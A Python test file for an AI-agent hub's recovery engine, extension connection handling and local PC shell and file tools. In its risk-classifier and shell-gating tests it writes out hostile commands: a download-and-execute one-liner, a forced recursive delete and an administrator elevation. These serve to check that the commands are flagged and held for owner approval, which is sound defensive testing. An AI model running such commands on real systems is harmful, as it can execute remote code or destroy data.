"""EmaraAI V2: recovery engine, connection manager, local PC bridge, control connector, diagnostics, failure tests."""
import asyncio
import time
from pathlib import Path

from starlette.testclient import TestClient

from emaraai_hub.core.models import ChatObservation, ChatState
from emaraai_hub.infra.db import Database
from emaraai_hub.pc_native.runtime import classify
from emaraai_hub.runtime.app import create_app
from emaraai_hub.runtime.hub import Hub
from tests.conftest import Caller, make_settings
from tests.test_supervisor import _setup


def _events(hub):
    return [e["type"] for e in hub.services.bus.recent(limit=300)]


def _rec(hub, target):
    return [r for r in hub.services.repos.recoveries.recent(50) if r["target"] == target]


# ---------------------------------------------------------------- recovery engine
async def test_thinking_stuck_is_recovered_and_verified(hub, master, agent, driver, clock):
    msid, asid, tid = await _setup(hub, master, agent, driver)
    await agent("inbox_read", session_id=asid)
    driver.set_state(asid, ChatState.GENERATING)
    await hub.supervisor.tick()
    clock.advance(hub.settings.supervisor.stall_seconds + 5)
    await hub.supervisor.tick()                                             # detect -> classify -> strategy -> execute
    rec = _rec(hub, asid)[0]
    assert rec["problem"] == "thinking_stuck" and rec["status"] == "verifying" and rec["attempt"] == 1
    assert driver.stopped == [asid]
    clock.advance(3)
    await agent("task_start", session_id=asid, task_id=tid)                 # the chat works again
    driver.set_state(asid, ChatState.IDLE)
    await hub.supervisor.tick()                                             # verify
    assert _rec(hub, asid)[0]["status"] == "success"
    ev = _events(hub)
    assert ev.index("recovery.started") < ev.index("recovery.step") < ev.index("recovery.success")
    assert hub.connections.system_state() in ("READY", "BUSY")


async def test_thinking_recovery_waits_for_its_prompt_delivery(hub, master, agent, driver, clock):
    msid, asid, tid = await _setup(hub, master, agent, driver)
    await agent("inbox_read", session_id=asid)
    driver.set_state(asid, ChatState.GENERATING)
    await hub.supervisor.tick()
    clock.advance(hub.settings.supervisor.stall_seconds + 5)
    await hub.supervisor.tick()
    assert _rec(hub, asid)[0]["status"] == "verifying"
    clock.advance(hub.settings.recovery.timeout_seconds + 5)
    sup = hub.supervisor
    view = await sup._view(hub.services.repos.sessions.get(asid))
    sup._delivery[asid] = {"text": "continue", "users": 0, "at": clock.now(), "chars": None}       # the recovery prompt is still on its way to the chat
    sup._verify_recovery(view)
    assert _rec(hub, asid)[0]["status"] == "verifying"                  # delivery queue/navigation time is not a failed recovery
    sup._delivery.pop(asid, None)
    sup._verify_recovery(view)
    assert _rec(hub, asid)[0]["status"] != "verifying"                  # once it has arrived, the usual evidence (or the timeout) decides


async def test_recovery_retries_then_requires_the_user(hub, master, agent, driver, clock):
    hub.settings.recovery.max_retries = 2
    hub.settings.supervisor.max_continues = 99                             # isolate the recovery engine from the rotation rule
    msid, asid, tid = await _setup(hub, master, agent, driver)
    await agent("inbox_read", session_id=asid)
    driver.set_state(asid, ChatState.GENERATING)
    await hub.supervisor.tick()
    for _ in range(4):
        clock.advance(hub.settings.supervisor.stall_seconds + 40)
        await hub.supervisor.tick()                                         # attempt, then verification fails (no sign of life)
        clock.advance(hub.settings.recovery.timeout_seconds + 5)
        await hub.supervisor.tick()
    recs = _rec(hub, asid)
    assert [r["status"] for r in recs if r["status"] == "failed"].__len__() == 2
    need = hub.services.repos.recoveries.needing_user()
    assert need and need[0]["target"] == asid and need[0]["step"] == "USER ACTION REQUIRED"
    assert hub.connections.system_state() == "DEGRADED"
    stops = len(driver.stopped)
    clock.advance(5000)
    await hub.supervisor.tick()
    assert len(driver.stopped) == stops                                     # no more automatic attempts until the user says so
    hub.recovery.retry(need[0]["id"])                                       # "Retry" on the Recovery Centre
    assert hub.services.repos.recoveries.needing_user() == []
    clock.advance(hub.settings.supervisor.stall_seconds + 40)
    await hub.supervisor.tick()
    assert len(driver.stopped) == stops + 1 and _rec(hub, asid)[0]["attempt"] == 1


async def test_recovery_switches_are_respected(hub, master, agent, driver, clock):
    hub.settings.recovery.thinking_recovery = False
    msid, asid, tid = await _setup(hub, master, agent, driver)
    await agent("inbox_read", session_id=asid)
    driver.set_state(asid, ChatState.GENERATING)
    await hub.supervisor.tick()
    clock.advance(hub.settings.supervisor.stall_seconds + 5)
    await hub.supervisor.tick()
    assert driver.stopped == [] and _rec(hub, asid) == []                   # switched off: detected, but nothing is touched
    hub.settings.recovery.thinking_recovery = True
    hub.settings.recovery.enabled = False
    await hub.supervisor.tick()
    assert driver.stopped == []


async def test_undelivered_prompt_is_sent_again(hub, master, agent, driver, clock):
    msid, asid, tid = await _setup(hub, master, agent, driver)
    driver.states[asid] = ChatObservation(ChatState.IDLE, raw={"user_turns": 1, "chars": 100})
    clock.advance(40)
    await hub.supervisor.tick()                                             # wake prompt typed...
    sent = [t for s, t in driver.sent if s == asid]
    assert len(sent) == 1 and "chat.delivery_started" in _events(hub)
    clock.advance(hub.settings.recovery.delivery_timeout_seconds + 5)       # ...but it never became a message (user_turns still 1)
    await hub.supervisor.tick()
    await hub.supervisor.tick()
    sent = [t for s, t in driver.sent if s == asid]
    assert len(sent) == 2 and sent[0] == sent[1]                            # the same prompt, delivered again
    assert "chat.delivery_failed" in _events(hub) and _rec(hub, asid)[0]["problem"] == "delivery_stuck"
    driver.states[asid] = ChatObservation(ChatState.GENERATING, raw={"user_turns": 2, "chars": 150})
    clock.advance(2)
    await hub.supervisor.tick()
    assert _rec(hub, asid)[0]["status"] == "success"


async def test_chat_phases_become_events(hub, master, agent, driver, clock):
    msid, asid, tid = await _setup(hub, master, agent, driver)
    await agent("inbox_read", session_id=asid)
    for state, chars in ((ChatState.GENERATING, 100), (ChatState.GENERATING, 100), (ChatState.GENERATING, 400), (ChatState.IDLE, 900)):
        driver.states[asid] = ChatObservation(state, raw={"user_turns": 1, "chars": chars})
        clock.advance(3)
        await hub.supervisor.tick()
    ev = [e for e in _events(hub) if e.startswith("chat.")]
    assert "chat.response_started" in ev and ev[-1] == "chat.response_completed"


# ---------------------------------------------------------------- "Needs you" is done automatically
async def test_waiting_prompts_are_delivered_when_automatic_mode_starts(tmp_path, clock, driver):
    from emaraai_hub.drivers.manual import ManualDriver
    from emaraai_hub.plugins.agent.server import build_agent_server
    from emaraai_hub.plugins.master.server import build_master_server
    hub = Hub(make_settings(tmp_path), db=Database(":memory:"), clock=clock, driver=ManualDriver())
    m, a = Caller(build_master_server(hub)), Caller(build_agent_server(hub))
    await m("project_create", name="nu", goal="g")
    msid = (await m("session_start", project="nu"))["session_id"]
    await m("hub_batch", session_id=msid, steps=[{"tool": "agent_create", "args": {"name": "dev", "title": "Dev", "instructions": "x"}},
                                                 {"tool": "task_assign", "args": {"agent": "dev", "title": "T", "instructions": "x"}}])
    await hub.supervisor.tick()
    assert [c["kind"] for c in hub.services.repos.commands.pending_manual()] == ["open_chat"]     # manual mode: waits for the user
    hub.driver = hub.supervisor.driver = driver                             # the user switches automatic mode on
    await hub.supervisor.tick()
    assert hub.services.repos.commands.pending_manual() == []               # nothing left to paste...
    assert len(driver.opened) == 1 and "session_start" in driver.opened[0][1]                      # ...the hub opened the agent chat itself


# ---------------------------------------------------------------- connection manager
def test_extension_telemetry_is_bounded_before_heartbeat_poll():
    sw = (Path(__file__).parents[1] / "extension" / "sw.js").read_text(encoding="utf-8")
    assert "Promise.race([refreshTelemetry(), sleep(5000).then(currentTelemetry)])" in sw


async def test_extension_connection_state_machine(hub, monkeypatch):
    await hub.set_driver("extension")
    cm, bridge = hub.connections, hub.ext_bridge
    await cm.tick()
    assert cm.c["extension"].state == "DISCONNECTED" and cm.system_state() == "DEGRADED"
    token = bridge.hello("inst-1", "1.1.0")["token"]                        # handshake
    assert bridge.authorized(token) and not bridge.authorized("wrong")
    await bridge.poll("1.1.0", wait=0.01, telemetry={"signed_in": True, "tabs": 2})
    await cm.tick()
    assert cm.c["extension"].state == "CONNECTED" and cm.c["chatgpt"].state == "CONNECTED"
    bridge.last_seen = time.monotonic() - 50                                # heartbeat late
    await cm.tick()
    assert cm.c["extension"].state == "DEGRADED"
    bridge.last_seen = time.monotonic() - 200                               # gone
    await cm.tick()
    assert cm.c["extension"].state == "DISCONNECTED"
    assert hub.services.repos.recoveries.open_for("extension")["problem"] == "extension_lost"
    assert hub.connections.system_state() == "RECOVERING"
    second = bridge.hello("inst-1", "1.1.0")                                # the extension reconnects by itself
    assert second["token"] != token and not bridge.authorized(token)        # old token is dead (no replay)
    await bridge.poll("1.1.0", wait=0.01, telemetry={"signed_in": True, "tabs": 1})
    await cm.tick()
    assert cm.c["extension"].state == "CONNECTED" and cm.c["extension"].reconnects == 1
    assert hub.services.repos.recoveries.recent(5)[0]["status"] == "success"
    ev = _events(hub)
    assert "browser.extension_connected" in ev and "browser.extension_lost" in ev and "connection.degraded" in ev


def test_extension_endpoints_need_handshake_and_origin(tmp_path, clock, driver):
    s = make_settings(tmp_path)
    hub = Hub(s, db=Database(":memory:"), clock=clock, driver=driver)
    with TestClient(create_app(s, hub, start_workers=False), base_url="http://127.0.0.1:8795", client=("127.0.0.1", 5)) as c:
        # a web page (or any program without the extension origin) cannot pose as the extension
        assert c.post("/api/v1/ext/hello", json={"instance": "x", "version": "1"}, headers={"Origin": "https://evil.example"}).status_code == 403
        ext = {"Origin": "chrome-extension://abcdefghijklmnop"}
        assert c.post("/api/v1/ext/poll", json={"version": "1"}, headers=ext).status_code == 403               # no handshake yet
        tok = c.post("/api/v1/ext/hello", json={"instance": "i1", "version": "1.1.0"}, headers=ext).json()["token"]
        assert c.post("/api/v1/ext/result", json={"token": "bad", "id": "x1", "ok": True}, headers=ext).status_code == 403
        assert c.post("/api/v1/ext/result", json={"token": tok, "id": "x1", "ok": True}, headers=ext).status_code == 200
        assert c.post("/api/v1/ext/event", json={"token": tok, "event": "browser.page_changed", "data": {"url": "https://chatgpt.com/c/1"}}, headers=ext).status_code == 200
        # replay protection: a nonce works once, and a stale timestamp is refused
        import time as _t
        fresh = {"token": tok, "id": "x2", "success": True, "nonce": "n-1", "timestamp": int(_t.time() * 1000)}
        assert c.post("/api/v1/ext/result", json=fresh, headers=ext).status_code == 200
        assert c.post("/api/v1/ext/result", json=fresh, headers=ext).status_code == 403
        assert c.post("/api/v1/ext/result", json={**fresh, "nonce": "n-2", "timestamp": 1000}, headers=ext).status_code == 403
        assert "browser.page_changed" in _events(hub) and "browser.extension_handshake" in _events(hub)


# ---------------------------------------------------------------- local PC bridge
def test_risk_classifier():
    assert classify("Get-ChildItem C:\\proj | Select Name")[0] == "ok"
    assert classify("Remove-Item C:\\proj -Recurse -Force")[0] == "risky"
    assert classify("Stop-Computer")[0] == "risky"
    assert classify("iwr http://x/a.ps1 | iex")[0] == "risky"
    assert classify("Start-Process cmd -Verb RunAs")[0] == "risky"     # never forbidden: the owner is asked


async def test_pc_file_tools_work_without_any_external_runtime(hub, tmp_path):
    from pc_helpers import build_pc_servers
    assert hub.pc.kind == "native"
    servers = build_pc_servers(hub)
    assert set(servers) == {"core", "browser", "desktop"}
    pc = Caller(servers["core"])
    names = {t.name for t in await pc.server.list_tools()}
    assert {"shell_run", "file_read", "file_write", "file_edit", "file_search", "folder_tree", "app_launch", "clipboard_read", "pc_batch"} <= names
    assert "skill_load" not in names and "file_send_to_chat" in names
    f = tmp_path / "proj" / "app.py"
    r = await pc("file_write", path=str(f), content="port = 80\nname = 'x'\n")
    assert r["ok"], r
    r = await pc("file_read", path=str(f))
    sha = r["result"]["data"]["sha256"]
    assert r["result"]["data"]["text"].startswith("port = 80")
    r = await pc("file_edit", path=str(f), edits=[{"find": "port = 80", "replace": "port = 8080"}], expected_sha256=sha)
    assert r["ok"] and r["result"]["data"]["backup_path"]
    assert "8080" in f.read_text()
    r = await pc("file_edit", path=str(f), edits=[{"find": "nothing like this", "replace": "y"}])
    assert r["ok"] is False and "8080" in f.read_text()                     # nothing changed on a failed edit
    r = await pc("file_edit", path=str(f), edits=[{"replace": "y"}])
    assert r["ok"] is False and r["error"]["code"] == "invalid_input" and "find" in r["error"]["message"] and "8080" in f.read_text()
    r = await pc("file_write", path=str(f), content="z", expected_sha256=sha)
    assert r["ok"] is False                                                 # stale sha: refuses to overwrite newer content
    r = await pc("pc_batch", steps=[{"tool": "file_search", "args": {"folder": str(tmp_path / "proj"), "query": "8080"}},
                                    {"tool": "folder_tree", "args": {"folder": str(tmp_path / "proj"), "depth": 3}},
                                    {"tool": "file_info", "args": {"path": str(f)}}])
    assert r["ok"] and r["result"]["steps"][0]["result"]["data"]["matches"][0]["line"] == 1
    assert "app.py" in r["result"]["steps"][1]["result"]["data"]["tree"]


async def test_pc_shell_runs_and_gates_risky_commands(hub):
    from pc_helpers import build_pc_servers
    pc = Caller(build_pc_servers(hub)["core"])
    r = await pc("shell_run", script="'hello ' + (2+3)", timeout_seconds=40)
    assert r["ok"] and "hello 5" in r["result"]["data"]["output"]
    hub.settings.pc.approval_wait_seconds = 0.1
    r = await pc("shell_run", script="Remove-Item C:\\definitely-not-here-xyz -Recurse")
    assert r["ok"] is False and r["error"]["code"] == "approval_pending"                        # waits for the owner, is not refused
    r = await pc("shell_run", script="Start-Process notepad -Verb RunAs")
    assert r["ok"] is False and r["error"]["code"] == "approval_pending" and "administrator" in r["error"]["message"]
    r = await pc("shell_run", script="'line one'; Write-Host \"`e[31mred text`e[0m\"; exit 3")
    assert r["ok"] is False and r["error"]["code"] == "exit_nonzero" and r["result"]["data"]["exit_code"] == 3      # the script failed, the tool did not:
    assert "line one" in r["result"]["data"]["output"] and "red text" in r["result"]["data"]["output"]            # the whole output is there,
    assert "\x1b" not in r["result"]["data"]["output"]                                                             # without colour codes
    r = await pc("shell_run_steps", steps=[{"label": "a", "script": "'first ok'"}, {"label": "b", "script": "'second says why'; exit 2"}])
    assert r["error"]["code"] == "exit_nonzero" and "second says why" in r["result"]["data"]["steps"][1]["output"]


# ---------------------------------------------------------------- diagnostics + pages


def test_control_center_endpoints(tmp_path, clock, driver):
    s = make_settings(tmp_path)
    hub = Hub(s, db=Database(":memory:"), clock=clock, driver=driver)
    with TestClient(create_app(s, hub, start_workers=False)) as c:
        sy = c.get("/api/v1/system").json()
        assert sy["state"] in ("IDLE", "READY", "DEGRADED") and {x["name"] for x in sy["components"]} == {"core", "plugin", "extension", "chatgpt", "bridge", "browser", "public"}
        assert 0 <= sy["health"] <= 100 and set(sy["stats"]) >= {"total_requests", "successful", "failed", "avg_response_ms"} and sy["user"]
        r = c.get("/api/v1/recovery").json()
        assert r["config"]["max_retries"] == 3 and r["active"] == []
        assert c.post("/api/v1/config", json={"changes": {"recovery.max_retries": 5, "recovery.thinking_recovery": False}}).json()["restart_required"] == []
        assert hub.settings.recovery.max_retries == 5 and hub.settings.recovery.thinking_recovery is False      # Recovery Centre applies live
        t = c.post("/api/v1/recovery/test").json()
        assert t["result"] == "PASS", t
        d = c.get("/api/v1/diagnostics").json()
        assert d["summary"]["PASS"] >= 5 and all("name" in x for x in d["checks"])
        logs = c.get("/api/v1/logs?component=recovery&limit=20").json()["lines"]
        assert logs and logs[0]["component"] == "recovery" and logs[0]["level"] in ("INFO", "WARNING")
        a = c.get("/api/v1/about").json()
        assert a["version"] == "3.5.0" and a["pc_bridge"] == "native" and a["schema"] >= 4
        page = c.get("/advanced").text + c.get("/ui/classic.js").text
        for title in ("Dashboard", "Plan", "Team", "Agents", "Project Flow", "n8n Workflows", "Connections", "Recovery Centre", "Activity", "Logs", "Diagnostics", "Settings", "About"):
            assert f"'{title}'" in page


def test_core_restart_keeps_recovery_history_and_settings(tmp_path, clock, driver):
    s = make_settings(tmp_path)
    db = Database(tmp_path / "hub.sqlite3")
    hub = Hub(s, db=db, clock=clock, driver=driver)
    rec = hub.recovery.begin("S-TEST", "thinking_stuck", "stop_and_continue")
    hub.recovery.finish(rec, False, "no sign of life")
    db.close()
    hub2 = Hub(s, db=Database(tmp_path / "hub.sqlite3"), clock=clock, driver=driver)       # core restarted
    again = hub2.recovery.begin("S-TEST", "thinking_stuck", "stop_and_continue")
    assert again is None                                                     # still cooling down: the restart did not forget
    clock.advance(10)
    assert hub2.recovery.begin("S-TEST", "thinking_stuck", "stop_and_continue")["attempt"] == 2   # attempt count survived
